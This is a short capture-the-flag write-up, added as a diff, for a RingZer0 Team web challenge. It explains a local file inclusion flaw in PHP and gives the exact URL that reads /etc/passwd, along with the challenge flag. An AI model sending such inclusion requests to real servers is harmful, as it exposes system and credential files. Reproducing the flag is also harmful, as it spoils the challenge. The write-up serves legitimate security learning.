@@ -1,0 +1,41 @@
+url: http://ringzer0team.com/challenges/75
+flag: FLAG-zH9g1934v774Y7Zx5s16t5ym8Z
+
+
+from the get-go we can immediately spot a lfi (local file inclusion) on the url
+we're given: http://ringzer0team.com:1008/?page=lorem.php. a lfi allows us to
+include any file in the allowed paths, or execute code.
+
+for the sake of explaination, i'll make use of a special kind of lfi to obtain
+the php source code for the index.php page in order to pinpoint the lfi vuln:
+
+
+    (base64 decoded, beautified and stripped of useless lines):
+    <?php
+        error_reporting(E_ALL);
+        ini_set('display_errors', 1);
+        $include = isset($_GET['page']) ? $_GET['page'] : 'lorem.php';
+        ...
+    <html>
+        ...
+        <?php require($include); ?>
+        ...
+    </html>
+
+
+as we can see, the $include var is being initialized to an user-supplied value
+through the 'page' get parameter without being sanitized first. it will then be
+subsequentially included in the page via require(): replacing 'lorem.php' with
+anything we'd like to read does the trick; in this case, '/etc/passwd'.
+
+
+    http://ringzer0team.com:1008/?page=/etc/passwd
+
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    ...
+    nobody:x:65534:65534:FLAG-zH9g1934v774Y7Zx5s16t5ym8Z:/nonexistent:/usr/sbin/nologin
+    ...
+
+
+and here's the flag.
